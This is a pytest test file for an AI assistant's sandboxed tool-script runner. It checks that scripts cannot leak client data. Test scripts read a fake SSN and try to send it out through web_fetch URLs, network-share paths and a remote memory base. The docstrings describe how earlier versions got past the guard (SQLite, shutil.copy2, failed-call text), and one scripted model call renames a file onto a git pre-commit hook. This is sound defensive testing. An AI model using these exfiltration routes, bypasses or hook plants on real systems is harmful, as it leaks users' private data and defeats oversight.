"""v1.473.0, the independent review: each defect it found, pinned against the
REAL registry and a REAL isolated worker (the `world` fixture of
tests/test_script_power_v1473.py) or the real stream lane (`desk`).

* the record of what a script read survives the chat being SAVED while the
  script runs (the worker is renamed then), and so does a kept value;
* a call that FAILED still handed the script its words: it counts as a read;
* SQLite is refused in a tool script (it opens files with no `open` event, so
  its reads were invisible to the rule, reached any path on the disk and
  could write into the working folder);
* a RENAME onto, or away from, one of Git's or Iron Jarvis's own files gets
  the once-only safety card a write of the same file gets;
* `skill_update` removes only Iron Jarvis's own saved-script note, never the
  user's text under a heading that merely starts the same way;
* what a card shows is worked out without reading megabytes on the event
  loop.
"""

from __future__ import annotations

import asyncio
import json
import sqlite3

import pytest

from iron_jarvis.core import auto_approve as AA
from iron_jarvis.skills import saved_scripts as SS
from iron_jarvis.tools import apply_changes as AC
from iron_jarvis.tools import script_values as SV
from iron_jarvis.tools import tool_script as TS
from iron_jarvis.tools.base import (
    GUARDED_EDIT_TOOLS, Reversibility, Tool, ToolContext, ToolResult, guarded_edit_check,
)
from iron_jarvis.tools.tool_script import NAME
from tests.test_script_power_lanes_v1473 import (  # noqa: F401  (fixtures)
    Model, _body, _call, _stream, desk,
)
from tests.test_script_power_v1473 import READERS, _invoke, _run, world  # noqa: F401

pytestmark = pytest.mark.timeout(240)

SSN = "123-45-6789"


def _first_turn(world) -> ToolContext:
    """A NEW chat's first message: no saved chat yet, keyed by the turn."""
    return ToolContext(
        workspace=world.ws, session_id="chat", agent_run_id="chat", turn_id="turn_one",
        config=world.p.config, event_bus=world.p.event_bus, engine=world.p.engine,
    )


def _saved_chat(world) -> ToolContext:
    return ToolContext(
        workspace=world.ws, session_id="chat", agent_run_id="chat", thread_id="chat_saved",
        config=world.p.config, event_bus=world.p.event_bus, engine=world.p.engine,
    )


class _Link(Tool):
    """Stands in for POST /chat/turns/{id}/thread arriving while a script runs."""

    name = "link_now"
    description = "test"
    input_schema = {"type": "object", "properties": {}}
    reversibility = Reversibility.READONLY

    def __init__(self, platform) -> None:
        self.p = platform
        self.moved = -1

    async def execute(self, args, ctx):
        self.moved = await TS.adopt_turn_worker(self.p, "turn_one", "chat_saved")
        return ToolResult(ok=True, output=f"moved {self.moved}")


# --------------------------------------------------------------------------- #
# The chat is saved while its first script runs
# --------------------------------------------------------------------------- #

def test_what_a_script_read_is_remembered_when_its_chat_is_saved_mid_script(world):
    """The script opens a client file ITSELF (so the rename, not a tool call,
    is the only thing between the read and the send), the chat is saved, and
    the script then tries to send what it read."""
    (world.ws / "f0.txt").write_text(f"client ssn {SSN}\n", encoding="utf-8")
    world.ctx = _first_turn(world)
    code = (
        "import time\n"
        'secret = open("f0.txt").read()\n'
        "time.sleep(1.5)\n"
        "try:\n"
        '    tools.web_fetch(url="https://example.com/?d=" + secret.strip()[-11:])\n'
        '    print("SENT")\n'
        "except ToolError as e:\n"
        '    print("REFUSED", e)\n'
    )

    async def go():
        run = asyncio.ensure_future(world.p.registry.invoke(
            NAME, {"code": code}, world.ctx, world.p.permissions, allowed_names=set(READERS),
        ))
        await asyncio.sleep(0.6)
        moved = await TS.adopt_turn_worker(world.p, "turn_one", "chat_saved")
        return moved, await run

    moved, result = asyncio.run(go())
    assert moved == 1, "the link did land while the script ran"
    assert world.web.urls == [], world.web.urls
    assert "REFUSED" in result.output and "SENT" not in result.output, result.output


def test_a_read_made_after_the_chat_was_saved_is_remembered_by_the_next_message(world):
    link = _Link(world.p)
    world.p.registry.register(link)
    world.p.permissions._base["link_now"] = "allow"
    (world.ws / "f0.txt").write_text(f"client ssn {SSN}\n", encoding="utf-8")
    world.ctx = _first_turn(world)
    first = _run(world, (
        "tools.link_now()\n"
        'secret = tools.read_file(path="f0.txt").output\n'
        'print("held")\n'
    ), allowed=(*READERS, "link_now"))
    assert first.ok and link.moved == 1, (first.error, link.moved)
    # The NEXT message of the same chat, keyed by the saved chat now.
    world.ctx = _saved_chat(world)
    second = _run(world, (
        "try:\n"
        '    tools.web_fetch(url="https://example.com/?d=" + secret.strip()[-11:])\n'
        '    print("SENT")\n'
        "except ToolError as e:\n"
        '    print("REFUSED", e)\n'
    ))
    assert world.web.urls == [], world.web.urls
    assert "REFUSED" in second.output, second.output


def test_a_value_kept_after_the_chat_was_saved_is_found_by_the_chat(world):
    """`tools.keep` used the name the script STARTED under: a value kept
    after the link stayed under the turn's name, where the chat's later
    calls never look."""
    link = _Link(world.p)
    world.p.registry.register(link)
    world.p.permissions._base["link_now"] = "allow"
    world.ctx = _first_turn(world)
    r = _run(world, 'tools.link_now()\ntools.keep("totals", [["a", 1]])\nprint("ok")\n',
             allowed=(*READERS, "link_now"))
    assert r.ok, r.error
    assert SV.SHELF.names("chat:chat_saved") == ["totals"]
    assert SV.SHELF.names("chat:turn_one") == []


# --------------------------------------------------------------------------- #
# A failed call still handed the script its words
# --------------------------------------------------------------------------- #

class _Lookup(Tool):
    """A read tool that FAILS with data in its words, the way an app's tool
    does ("no such customer; did you mean …")."""

    name = "customer_lookup"
    description = "test"
    input_schema = {"type": "object", "properties": {"q": {"type": "string"}}}
    reversibility = Reversibility.READONLY

    async def execute(self, args, ctx):
        return ToolResult(ok=False, error=f"no customer '{args.get('q')}'. Did you mean: Jane Client (SSN {SSN})?")


def test_a_failed_call_counts_as_a_read(world):
    world.p.registry.register(_Lookup())
    world.p.permissions._base["customer_lookup"] = "allow"
    r = _run(world, (
        "try:\n"
        '    tools.customer_lookup(q="jane")\n'
        "except ToolError as e:\n"
        "    said = str(e)\n"
        "try:\n"
        '    tools.web_fetch(url="https://example.com/?d=" + said[-25:])\n'
        '    print("SENT")\n'
        "except ToolError as e:\n"
        '    print("REFUSED", e)\n'
    ), allowed=(*READERS, "customer_lookup"))
    assert world.web.urls == [], world.web.urls
    assert "REFUSED" in r.output, r.output


def test_a_failed_web_read_does_not_stop_the_next_web_read(world):
    """Control: public pages are not private, failed or not."""
    r = _run(world, (
        'tools.web_fetch(url="https://example.com/a")\n'
        'tools.web_fetch(url="https://example.com/b")\n'
        'print("ok")\n'
    ))
    assert r.ok and len(world.web.urls) == 2


# --------------------------------------------------------------------------- #
# SQLite in a tool script
# --------------------------------------------------------------------------- #

def _db(path) -> None:
    con = sqlite3.connect(path)
    con.execute("create table clients (name text, ssn text)")
    con.execute("insert into clients values ('Jane Client', ?)", (SSN,))
    con.commit()
    con.close()


@pytest.mark.parametrize("how", [
    'sqlite3.connect("clients.db")',
    'sqlite3.connect(":memory:")',
    'sqlite3.connect("file:clients.db?mode=ro", uri=True)',
    'sqlite3.Connection("clients.db")',
    'sqlite3.connect("made_by_script.db")',
])
def test_a_script_cannot_open_a_sqlite_database(world, how):
    _db(world.ws / "clients.db")
    r = _run(world, (
        "import sqlite3\n"
        "try:\n"
        f"    con = {how}\n"
        '    print("OPENED")\n'
        "except PermissionError as e:\n"
        '    print("BLOCKED", e)\n'
    ))
    assert "BLOCKED" in r.output and "OPENED" not in r.output, r.output
    assert "SQLite" in r.output
    assert not (world.ws / "made_by_script.db").exists()


def test_the_refusal_says_what_to_do_instead():
    assert "CSV" in W_SQLITE and "tool" in W_SQLITE


def test_a_script_cannot_reach_windows_own_file_calls_or_tcl(world):
    r = _run(world, (
        "out = []\n"
        "try:\n"
        "    import _winapi\n"
        '    _winapi.CreateFile("f0.txt", 0x80000000, 1, 0, 3, 0, 0)\n'
        '    out.append("winapi opened")\n'
        "except (PermissionError, ImportError, AttributeError, OSError) as e:\n"
        '    out.append("winapi " + type(e).__name__)\n'
        "try:\n"
        "    import tkinter\n"
        '    out.append("tkinter imported")\n'
        "except (PermissionError, ImportError) as e:\n"
        '    out.append("tkinter " + type(e).__name__)\n'
        "print(out)\n"
    ))
    assert "opened" not in r.output and "imported" not in r.output, r.output


def test_ordinary_script_work_is_untouched_by_the_new_refusals(world):
    """Control: the standard library a script really uses still imports and
    runs, and a plain file read still works."""
    r = _run(world, (
        "import csv, io, json, re, statistics, datetime, decimal, collections, math, pathlib\n"
        'text = open("f0.txt").read()\n'
        'rows = list(csv.reader(io.StringIO("a,b\\n1,2\\n")))\n'
        'print("OK", len(text) > 0, rows[1], statistics.mean([1, 2, 3]))\n'
    ))
    assert r.ok and "OK True ['1', '2'] 2" in r.output, (r.output, r.error)


def test_a_copy_is_seen_as_the_read_and_the_write_it_is(world, tmp_path):
    """`shutil.copy2` copies with Windows' own CopyFile2 on Python 3.12: no
    `open` event. A script copied a client file into its scratch folder and
    read it there unseen, read any file on the disk, and wrote anywhere."""
    (world.ws / "clients.csv").write_text(f"Jane Client,{SSN}\n", encoding="utf-8")
    outside = tmp_path / "elsewhere"
    outside.mkdir()
    (outside / "private.txt").write_text(f"not in the working folder: {SSN}\n", encoding="utf-8")
    src = str(outside / "private.txt").replace("\\", "/")
    dst = str(outside / "planted.txt").replace("\\", "/")

    r = _run(world, (
        "import os, shutil, tempfile\n"
        'copy = os.path.join(tempfile.gettempdir(), "c.csv")\n'
        'shutil.copy2("clients.csv", copy)\n'          # a read of the working folder
        "data = open(copy).read().strip()\n"
        "try:\n"
        '    tools.web_fetch(url="https://example.com/?d=" + data)\n'
        '    print("SENT")\n'
        "except ToolError as e:\n"
        '    print("REFUSED", e)\n'
    ))
    assert world.web.urls == [] and "REFUSED" in r.output, r.output

    r = _run(world, (
        "import os, shutil, tempfile\n"
        "said = []\n"
        "for label, a, b in [\n"
        f'    ("outside-read", "{src}", os.path.join(tempfile.gettempdir(), "p.txt")),\n'
        '    ("into-the-folder", "f0.txt", "f0-copy.txt"),\n'
        '    ("over-a-file", "f1.txt", "f0.txt"),\n'
        f'    ("outside-write", "f0.txt", "{dst}"),\n'
        "]:\n"
        "    try:\n"
        "        shutil.copy2(a, b)\n"
        '        said.append(label + " COPIED")\n'
        "    except PermissionError:\n"
        '        said.append(label + " blocked")\n'
        "print(said)\n"
    ))
    assert "COPIED" not in r.output and r.output.count("blocked") == 4, r.output
    assert not (world.ws / "f0-copy.txt").exists()
    assert (world.ws / "f0.txt").read_text() == "file 0\n"
    assert not (outside / "planted.txt").exists()


def test_a_copy_inside_the_scratch_folder_still_works(world):
    """Control: a script may still copy its own temporary files."""
    r = _run(world, (
        "import os, shutil, tempfile\n"
        'a = os.path.join(tempfile.gettempdir(), "a.txt")\n'
        'open(a, "w").write("mine")\n'
        'shutil.copy2(a, a + ".bak")\n'
        'print("OK", open(a + ".bak").read())\n'
    ))
    assert r.ok and "OK mine" in r.output, (r.output, r.error)


# --------------------------------------------------------------------------- #
# A rename that replaces a file
# --------------------------------------------------------------------------- #

def test_a_file_replaced_by_a_rename_is_kept_never_destroyed(world):
    from tests.test_script_power_v1473 import WRITERS

    (world.ws / "f0.txt").write_text("THE CLIENT'S ONLY COPY\n", encoding="utf-8")
    r = _invoke(world, "rename_file", {"path": "f1.txt", "new_path": "f0.txt", "overwrite": True},
                allowed=WRITERS)
    assert r.ok, r.error
    assert (world.ws / "f0.txt").read_text() == "file 1\n" and not (world.ws / "f1.txt").exists()
    kept = r.data.get("replaced_kept")
    assert kept and "kept at" in r.output and "does not put the replaced one back" in r.output
    from pathlib import Path

    kept = Path(kept)
    assert kept.read_text(encoding="utf-8") == "THE CLIENT'S ONLY COPY\n"
    assert world.home in kept.parents and "trash" in kept.parts


def test_an_ordinary_rename_says_and_keeps_nothing_extra(world):
    from tests.test_script_power_v1473 import WRITERS

    r = _invoke(world, "rename_file", {"path": "f1.txt", "new_path": "g1.txt"}, allowed=WRITERS)
    assert r.ok and "replaced_kept" not in r.data and "kept at" not in r.output
    assert r.output.startswith("renamed:") and not (world.home / "trash").exists()
    # overwrite=true with nothing there to replace is an ordinary rename too.
    r = _invoke(world, "rename_file", {"path": "f2.txt", "new_path": "g2.txt", "overwrite": True},
                allowed=WRITERS)
    assert r.ok and "replaced_kept" not in r.data and not (world.home / "trash").exists()


def test_a_batch_never_replaces_a_file_by_renaming(world):
    from tests.test_script_power_v1473 import GRANTED, WRITERS

    (world.ws / "f0.txt").write_text("THE CLIENT'S ONLY COPY\n", encoding="utf-8")
    changes = [
        {"tool": "rename_file", "args": {"path": "f2.txt", "new_path": "ok-2.txt"}},
        {"tool": "rename_file", "args": {"path": "f1.txt", "new_path": "f0.txt", "overwrite": True}},
    ]
    r = _invoke(world, "apply_changes", {"changes": changes}, allowed=WRITERS, session_allow=GRANTED)
    assert not r.ok and "NOTHING WAS CHANGED" in r.error and "overwrite" in r.error, r.error
    assert (world.ws / "f0.txt").read_text() == "THE CLIENT'S ONLY COPY\n"
    assert (world.ws / "f2.txt").is_file() and (world.ws / "f1.txt").is_file()
    # A script that plans one is told when its plan is handed over (the end
    # of the script), and no plan is kept.
    planned = _run(world, (
        'tools.plan("rename_file", path="f1.txt", new_path="f0.txt", overwrite=True)\n'
        'print("planned")\n'
    ), allowed=(*READERS, "rename_file", "apply_changes"))
    assert not planned.ok and "overwrite" in (planned.error or ""), (planned.output, planned.error)
    assert SV.SHELF.names("chat:chat_one") == []


# --------------------------------------------------------------------------- #
# A rename onto a guarded file
# --------------------------------------------------------------------------- #

def test_a_rename_is_one_of_the_guarded_tools(tmp_path):
    assert AA.MOVE_TOOL in GUARDED_EDIT_TOOLS
    ws = tmp_path / "w"
    (ws / ".git" / "hooks").mkdir(parents=True)
    onto = guarded_edit_check("rename_file", {"path": "notes.txt", "new_path": ".git/hooks/pre-commit"}, ws)
    away = guarded_edit_check("rename_file", {"path": ".git/config", "new_path": "old-config.txt"}, ws)
    rules = guarded_edit_check("rename_file", {"path": "x.txt", "new_path": "CLAUDE.md"}, ws)
    plain = guarded_edit_check("rename_file", {"path": "a.txt", "new_path": "b.txt"}, ws)
    for hit in (onto, away, rules):
        assert hit is not None and hit.ask and hit.once_only and hit.reason == AA.GUARD_REASON
        assert hit.dont_ask_skips and hit.attended_only
    assert "onto .git/hooks/pre-commit" in onto.words
    assert plain is None


@pytest.mark.asyncio
async def test_a_rename_onto_a_git_hook_gets_the_once_only_safety_card(desk):
    app, ws = desk
    (ws / ".git" / "hooks").mkdir(parents=True)
    (ws / "statement-notes.txt").write_text("#!/bin/sh\ncalc.exe\n", encoding="utf-8")
    model = Model([
        _call(1, "rename_file", path="statement-notes.txt", new_path=".git/hooks/pre-commit"),
        "Renamed.",
    ])
    request = "Rename the statement files here so each name starts with its month."
    frames, cards, done = await _stream(app, _body(ws, request), model, decision="deny")
    assert "rename_file" in model.offered[0]
    assert len(cards) == 1 and cards[0].get("tool") == "rename_file"
    assert cards[0].get("once_only") is True and cards[0].get("once_reason") == "guarded"
    assert not (ws / ".git" / "hooks" / "pre-commit").exists()
    assert (ws / "statement-notes.txt").is_file()


@pytest.mark.asyncio
async def test_an_ordinary_rename_still_runs_without_a_card(desk):
    app, ws = desk
    (ws / ".git").mkdir()
    model = Model([_call(1, "rename_file", path="f0.txt", new_path="2026-01-f0.txt"), "Renamed."])
    request = "Rename the statement files here so each name starts with its month."
    frames, cards, done = await _stream(app, _body(ws, request), model)
    assert not cards and (ws / "2026-01-f0.txt").is_file()


# --------------------------------------------------------------------------- #
# skill_update keeps the user's text
# --------------------------------------------------------------------------- #

BODY = (
    "# Month-end close\n\n"
    "## Before you start\nAsk which month.\n\n"
    "### Saved script library\nOur team keeps its macros on the S: drive.\n\n"
    "## Saved scripts and where they live\nIn the shared folder.\n\n"
    "## Review steps\n1. Tie out cash.\n2. NEVER skip the partner review.\n"
)


def _skill(world, tool, **args):
    async def go():
        return await world.p.registry.invoke(
            tool, args, world.ctx, world.p.permissions,
            allowed_names={tool}, session_allow={tool},
        )

    return asyncio.run(go())


def test_only_the_apps_own_note_is_ever_removed():
    assert SS.without_run_note(BODY) == BODY
    noted = SS.with_run_note(BODY, "month-end-close")
    assert noted.count(SS.NOTE_HEAD + "\n" + SS._NOTE_FIRST) == 1
    assert SS.without_run_note(noted).rstrip() == BODY.rstrip()
    # Twice is still once.
    assert SS.with_run_note(noted, "month-end-close") == noted
    # Text the user wrote AFTER the note stays.
    after = noted + "\n## My own last section\nKeep this.\n"
    kept = SS.without_run_note(after)
    assert "Keep this." in kept and "NEVER skip the partner review" in kept
    assert SS._NOTE_FIRST not in kept
    # A heading of the user's own that is exactly the note's, with their own
    # words under it, is theirs.
    own = "# X\n\n## Saved script\nWe keep ours in the vault.\n\n## Next\nMore.\n"
    assert SS.without_run_note(own) == own


def test_a_description_only_update_keeps_every_line_of_the_instructions(world):
    made = _skill(world, "skill_create", name="month-end-close", description="Close the month.",
                  instructions=BODY)
    assert made.ok, made.error
    path = world.home / "skills" / "month-end-close" / "SKILL.md"
    r = _skill(world, "skill_update", name="month-end-close", description="Close the month (2026).")
    assert r.ok, r.error
    after = path.read_text(encoding="utf-8")
    for line in ("Saved script library", "Saved scripts and where they live", "Review steps",
                 "NEVER skip the partner review", "Close the month (2026)."):
        assert line in after, (line, after)


def test_adding_and_replacing_a_script_keeps_the_users_text_and_one_note(world):
    made = _skill(world, "skill_create", name="month-end-close", description="Close the month.",
                  instructions=BODY)
    assert made.ok, made.error
    path = world.home / "skills" / "month-end-close" / "SKILL.md"
    for code in ('print("one")\n', 'print("two")\n'):
        r = _skill(world, "skill_update", name="month-end-close", script=code)
        assert r.ok, r.error
        text = path.read_text(encoding="utf-8")
        assert text.count(SS._NOTE_FIRST) == 1
        assert "NEVER skip the partner review" in text and "Saved script library" in text


# --------------------------------------------------------------------------- #
# What a card shows is cheap to work out
# --------------------------------------------------------------------------- #

def test_a_line_is_bounded_before_it_is_masked(monkeypatch):
    """This runs on the event loop for every line of a card. A plan whose
    200 paths were 39,000 characters each took 0.9 s there; counted here by
    what the mask is handed, never by a clock."""
    from iron_jarvis.detections import redact

    seen: list[int] = []
    real = redact.mask

    def spy(text, *a, **kw):
        seen.append(len(str(text)))
        return real(text, *a, **kw)

    monkeypatch.setattr(redact, "mask", spy)
    change = {"tool": "rename_file", "args": {"path": "d/" + "x" * 39_000, "new_path": "n"}}
    line = AC.describe_change(change)
    assert len(line) <= 160 and line.startswith("Rename d/xxx")
    assert seen and max(seen) <= 2_000, seen

    seen.clear()
    summary = SV.describe("A" * 7_900_000)
    assert summary.startswith("text, 7,900,000 characters")
    assert seen and max(seen) <= 2_000, seen

    seen.clear()
    wide = SV.describe([["cell " * 400_000, 1], ["b", 2]])
    assert wide.startswith("2 rows, up to 2 columns; first row:")
    assert seen and max(seen) <= 2_000, seen


def test_a_summary_reads_the_same_as_before_for_ordinary_values():
    assert SV.describe([["Name", "Amount"], ["alpha", 1234.56]]) == (
        '2 rows, up to 2 columns; first row: ["Name", "Amount"]'
    )
    assert SV.describe([{"a": 1, "b": "x"}]) == '1 items; first: {"a": 1, "b": "x"}'
    assert SV.describe([1, 2, 3]) == "a list of 3; first: 1"
    assert SV.describe({"k": 1, "j": 2}) == "2 named entries: k, j"
    deep = [[[[[[[["bottom"]]]]]]]]
    assert "…" in SV.describe(deep)
    assert json.loads(json.dumps(SV.describe(deep)))


# --------------------------------------------------------------------------- #
# A path on another computer, a memory base off this PC, another app's resource
# --------------------------------------------------------------------------- #

SHARE = "\\\\203.0.113.7\\x\\"


@pytest.mark.parametrize("value,key,want", [
    ("\\\\203.0.113.7\\x\\secret.txt", "path", True),
    ("//203.0.113.7/x/secret.txt", "path", True),
    ("\\\\?\\UNC\\host\\share\\a", "path", True),
    ("\\\\.\\pipe\\name", "path", True),
    ("\\\\server", "folder", True),
    ("\\\\?\\C:\\Users\\x\\a.txt", "path", False),
    ("C:\\Users\\x\\a.txt", "path", False),
    ("f0.txt", "path", False),
    ("sub/f0.txt", "path", False),
    # Not a path argument: only the backslash spelling of a share counts.
    ("//TODO fix this", "pattern", False),
    ("\\\\d+\\.\\d+", "pattern", False),
    ("\\\\host\\share\\file", "pattern", True),
    ("//", "path", False),
    (12, "path", False),
])
def test_a_network_path_is_told_from_its_text(value, key, want):
    assert TS.network_path(value, key) is want


def test_a_path_inside_a_working_folder_that_is_itself_on_a_share_is_not_one():
    home = "\\\\srv\\clients\\smith"
    assert TS._network_path_in({"path": "\\\\srv\\clients\\smith\\2026\\k1.pdf"}, home) == ""
    assert TS._network_path_in({"path": "//SRV/clients/Smith/2026/k1.pdf"}, home) == ""
    assert TS._network_path_in({"path": "\\\\srv\\clients\\smithers\\k1.pdf"}, home)
    assert TS._network_path_in({"paths": ["a.txt", "//other/x/y"]}, "C:\\work") == "//other/x/y"
    assert TS._network_path_in({"path": "a.txt", "pattern": "//x"}, "C:\\work") == ""


def test_a_script_holding_this_pcs_data_cannot_open_a_path_on_another_computer(world):
    """The file readers count as local, but opening `\\\\host\\share\\<data>`
    makes Windows connect to that host. Refused BEFORE the tool is called:
    no reader ever sees the path."""
    (world.ws / "f0.txt").write_text("SSN-123-45-6789\n", encoding="utf-8")
    names = (*READERS, "read_document", "grep", "glob")
    code = (
        f"HOST = {SHARE!r}\n"
        'secret = tools.read_file(path="f0.txt").output.strip()\n'
        "said = {}\n"
        "for tool, args in [\n"
        '    ("read_file", {"path": HOST + secret + ".txt"}),\n'
        '    ("read_document", {"path": HOST + secret + ".pdf"}),\n'
        '    ("list_files", {"path": HOST + secret}),\n'
        '    ("grep", {"pattern": "x", "path": HOST + secret}),\n'
        '    ("glob", {"pattern": "*", "path": HOST + secret}),\n'
        "]:\n"
        "    try:\n"
        "        tools.call(tool, **args)\n"
        '        said[tool] = "CALLED"\n'
        "    except ToolError as e:\n"
        "        said[tool] = str(e)\n"
        "print(json.dumps(said))\n"
    )
    r = _run(world, "import json\n" + code, allowed=names)
    said = json.loads(r.output[r.output.index("{"): r.output.rindex("}") + 1])
    assert set(said) == {"read_file", "read_document", "list_files", "grep", "glob"}
    for tool, words in said.items():
        assert "another computer" in words, (tool, words)
    # The registry made exactly one read_file call: the first, local one.
    from tests.test_script_power_v1473 import _rows

    assert len(_rows(world, "read_file")) == 1
    for tool in ("read_document", "list_files", "grep", "glob"):
        assert _rows(world, tool) == [], tool


class _RemoteBase:
    """A memory base that is not a notes folder on this PC."""

    name = "notion"

    def __init__(self) -> None:
        self.queries: list[str] = []

    def search(self, query, k=5):
        self.queries.append(str(query))
        return []

    def health(self):
        return {"ok": True}


def test_a_memory_base_off_this_pc_is_a_place_outside(world):
    script = world.p.registry.get(NAME)
    manager = world.p.registry.get("ltm_search").manager
    local_now = all(
        __import__("iron_jarvis.providers.egress", fromlist=["x"]).ltm_connector_is_local(c)
        for c in manager.connectors()
    )
    if local_now:
        for name in ("ltm_search", "brain_search", "brain_read"):
            assert script._origin(name) == ("local", False), name
    base = _RemoteBase()
    manager.register(base)
    for name in ("ltm_search", "brain_search", "brain_read"):
        assert script._origin(name) == (TS._MEMORY_ORIGIN, True), name
        assert script._carry_refusal(name, {"local"}), name
        # What the memory base said may go back to the memory base.
        assert script._carry_refusal(name, {TS._MEMORY_ORIGIN}) == "", name
    # ...and must not ride a web call.
    assert script._carry_refusal("web_fetch", {TS._MEMORY_ORIGIN})

    (world.ws / "f0.txt").write_text("SSN-123-45-6789\n", encoding="utf-8")
    r = _run(world, (
        'secret = tools.read_file(path="f0.txt").output.strip()\n'
        "try:\n"
        "    tools.ltm_search(query=secret)\n"
        '    print("ASKED")\n'
        "except ToolError as e:\n"
        '    print("REFUSED", e)\n'
    ), allowed=(*READERS, "ltm_search"))
    assert "REFUSED" in r.output and "ASKED" not in r.output, r.output
    assert base.queries == []


def test_a_resource_read_belongs_to_the_app_it_names(world):
    script = world.p.registry.get(NAME)
    assert script._origin("mcp_read_resource", {"server": "gmail", "uri": "x"}) == ("pack:gmail", True)
    assert script._origin("mcp_read_resource", {}) == ("outside:mcp_read_resource", True)
    held = {"pack:gmail"}
    assert script._carry_refusal("mcp_read_resource", held, {"server": "gmail", "uri": "a"}) == ""
    said = script._carry_refusal("mcp_read_resource", held, {"server": "slack", "uri": "a"})
    assert "the app gmail" in said
    # One app's own tool and its resources are one place.
    assert script._carry_refusal("mcp__gmail__search", held, {"q": "x"}) == ""


from iron_jarvis.repl import worker as _W  # noqa: E402

W_SQLITE = _W._SQLITE_BLOCKED
